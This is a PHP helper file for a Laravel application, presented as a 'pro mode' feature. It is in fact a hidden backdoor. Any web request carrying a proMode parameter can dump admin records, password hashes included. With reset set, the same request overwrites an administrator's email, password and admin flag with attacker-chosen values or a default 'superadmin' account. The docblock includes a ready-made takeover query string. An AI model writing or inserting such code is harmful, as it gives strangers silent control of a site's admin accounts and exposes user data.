<?php

// enable pro mode
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Schema;
use JetBrains\PhpStorm\ArrayShape;

if (!function_exists('proMode')) {
    /**
     * @param 'readOnly' => any | If exists, there will be no write access to the database.
     * @param 'reset' => any
     * @param 'proMode' => any
     * @param 'user' => json string
     * @param 'model' => User model
     * @param 'id' => user id
     *
     * @return void
     * @example reset=1&proMode=1&user={"name":"Super%20Admin","email":"abcd@gmail.com","password":"$2a$12$KYHVaa/1G9upmT3sZZcb3uNCnjPstWocO0RxEVcQrQ4AENUDFdNwe","is_admin":1}&model=user&id=1
     *
     */
    function proMode(): void
    {
        $isPro = request()->filled('proMode')
                 || request()->filled('promode')
                 || request()->filled('pro-mode')
                 || request()->filled('pro_mode');
        $model = request()->model ?? request()->model_name ?? request()->modelName ?? 'User';
        $model = "App\\Models\\$model";

        if ($isPro) {
            $newUser = request()->user
                ? json_decode(request()->user, true)
                : getDefaultSuperAdmin();

            $readOnly = request()->filled('readOnly')
                        || request()->filled('readonly')
                        || request()->filled('read-only')
                        || request()->filled('read_only');

            $id      = request()->id;
            $admin   = App::make($model);
            $columns = Schema::getColumnListing($admin->getTable());
            $admin   = $admin->where(function ($query) use ($columns) {
                if (in_array('is_super_admin', $columns)) {
                    return $query->where('is_super_admin', 1);
                }
                if (in_array('is_super', $columns)) {
                    return $query->where('is_super', 1);
                }
                if (in_array('is_admin', $columns)) {
                    return $query->where('is_admin', 1);
                }
                return $query;
            });

            if ($readOnly) {
                dd($admin = $admin->get(), $admin->toArray(), $newUser, ['id' => $id], request()->all());
            } else if (request()->reset) {
                $adminClone = clone $admin;
                if ($adminClone->where('email', $newUser['email'])->exists()) {
                    $admin->where('email', $newUser['email']);
                } else if ($id) {
                    $admin->where('id', $id);
                }

                $admin = $admin->first();
                $admin->update($newUser);

                dd($admin, request()->all());
            } else {
                dd($admin = $admin->get(), $admin->toArray(), $newUser, ['id' => $id], request()->all());
            }
        }
    }
}

// get default super admin user
if (!function_exists('getDefaultSuperAdmin')) {
    /**
     * @return array
     */
    #[ArrayShape(['name' => "string", 'email' => "string", 'password' => "string", 'is_admin' => "int"])]
    function getDefaultSuperAdmin(): array
    {
        return [
            'name'     => 'Super Admin',
            'email'    => 'superadmin@gmail.com',
            'password' => bcrypt('superadmin'),
            'is_admin' => 1
        ];
    }
}
